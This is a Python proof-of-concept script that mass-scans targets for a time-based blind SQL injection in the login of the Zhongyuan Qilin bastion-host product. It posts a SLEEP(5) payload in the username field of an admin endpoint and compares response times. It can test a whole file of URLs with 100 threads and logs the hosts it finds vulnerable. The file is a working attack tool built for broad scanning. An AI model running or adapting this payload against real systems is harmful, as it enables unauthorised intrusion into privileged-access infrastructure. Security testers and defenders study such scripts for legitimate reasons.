import requests, time, argparse, sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
             ███████╗ ██████╗ ██╗          ████████╗██╗███╗   ███╗███████╗
            ██╔════╝██╔═══██╗██║          ╚══██╔══╝██║████╗ ████║██╔════╝
            ███████╗██║   ██║██║             ██║   ██║██╔████╔██║█████╗
            ╚════██║██║▄▄ ██║██║             ██║   ██║██║╚██╔╝██║██╔══╝
            ███████║╚██████╔╝███████╗███████╗██║   ██║██║ ╚═╝ ██║███████╗
            ╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝

                                                                      author:wAw
                                                                      date:2024.09.03
                                                                      version:1.0
    """
    print(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description="中远麒麟堡垒机存在SQL注入")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = '/admin.php?controller=admin_commonuser'
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"

    try:
        res1 = requests.get(url=target + payload, headers=headers, verify=False)
        if res1.status_code == 200 and "username and password" in res1.text:
            res2 = requests.post(url=target + payload, headers=headers, data=data, verify=False)
            res3 = requests.post(url=target + payload, headers=headers, verify=False)
            time1 = res2.elapsed.total_seconds()
            time2 = res3.elapsed.total_seconds()

            if time1 - time2 >= 5:
                print(f"[+]{target}存在SQL注入")
                with open('中远_result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"[+]{target}存在SQL注入\n")
            else:
                print(f"[+]{target}不存在SQL注入")
    except Exception as e:
        print(e)


    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()